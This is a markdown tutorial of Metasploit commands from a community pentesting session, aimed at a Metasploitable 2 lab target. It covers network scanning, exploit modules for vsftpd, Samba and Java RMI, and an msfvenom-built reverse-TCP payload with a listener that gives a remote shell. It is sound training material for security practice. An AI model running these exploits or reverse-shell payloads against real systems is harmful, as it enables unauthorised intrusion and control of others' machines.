This file contains the commands showcased during the Null Humla session on `Metasploit for Pentesters` conducted on 27th May in Bhopal. Expecting contributions and improvements.



Inorder to get started with metasploit, the database needs to be setup. Metasploit uses **Postgresql** as its database
service postgresql start

This launches up the metasploit
```bash
msfconsole
```
---
In case database isn't connected even after starting the service 
```bash
msfdb init
```
this command initializes the database again with the very beginning

 Metasploit follows all the bash commands. Like nmap can be used as 
```bash
nmap -sn 192.168.1.1/24 -vv
```
but the results of the options like "hosts" is never stored in the metasploit database. In that case using db_nmap can be fruitful 

it saves all these ips to its database. It is helpful for future reference.

 -sn switch is a host scan in a subnet defined. -vv is the verbose. The number of v's can be increased in order to increase the verbosity.
```bash
db_nmap -sn 192.168.1.1/24 -vv
```
Determines the hosts
```bash
hosts
```
-A does the aggressive scan determining every single information about the host( open ports, banners, keys etc)
```bash
db_nmap -A 192.168.1.101 -vv
```
services determines the services that the available for that host
```bash
services
```
---

> Let's assume metasploitable 2 (Victim) IP to be 192.168.1.101

Multiple workspaces can be created for easy switching and comparing different results.

-a switch adds the new workspace named portscan
```bash
workspace -a portscan
```
This command switches between the workspaces
```bash
workspace portscan
```
search command searches for the keyword in all its modules
If you want to do a tcp scan then use the auxiliary written below in the command. Set the options according to the necessity.

setg (set global variable) can be used instead of set so that you won't have to set it again and again for the same victim 
machine

run is used for running the module

Here tcp portscan does the same work as that of nmap but doesnt gives the complete listings (like the name of services and their versions)
```bash
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.101
set THREADS 20
run
```
These are the metasploit modules for searching the versions of the services that are active in a victim's machine
```bash
search name:auxiliary ftp

`grep in metasploit is used  this way`
`name:auxiliary signifies that it will search only in the auxiliary modules`
grep ftp_version name:auxiliary ftp
use auxiliary/scanner/ftp/ftp_version
set...
run...
```
```bash
search name:auxiliary ssh
use auxiliary/scanner/ssh/ssh_version
setg...
run
```
```bash
search name:auxiliary telnet
use auxiliary/scanner/telnet/telnet_version
run
```

Google search port numbers - Find service running on that port - find auxiliary model for identifying version

If you can't find the service running on port, after some time it doesn't hurt to see nmap's finding

> same data
> port  21  vsftpd v 2.3.4
The vulnerabilities in the versions of the following services can be exploited by typing in following commands

search vsftpd name:exploit
use ...
set ...
run

---

> google search samba 3.x exploit

```bash
use exploit/multi/samba/usermap_script
show payloads
set payload ...
set <options>
run
```
Repeat the same for other detected versions

---

```bash
search name:exploit java rmi
use exploit/multi/misc/java_rmi_server
set payload java/meterpreter/reverse_tcp
set options
run
```
This will create a background session. *Java's version of meterpreter has less libraries*
```bash
sessions 
```
Will show a list of sessions
```bash
sessions -i <id>
```
use the meterpreter session 
```bash
sysinfo
getuid
shell
```
In another tab: Tab2
```bash
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=443 -f elf > evil 
```
Type below in Tab1's meterpreter session
```bash
upload evil
```
Start another msfconsole session in Tab2 and type below
```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <kali ip>
set LPORT 443
run
```
Back to Tab1
```bash
shell 
./evil
```
This will give you a proper `meterpreter`


Resources:
- [Vulnhub](https://www.vulnhub.com/)
- [HacktheBox](https://www.hackthebox.eu/)
- [Pentesters Lab](https://www.pentesterlab.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
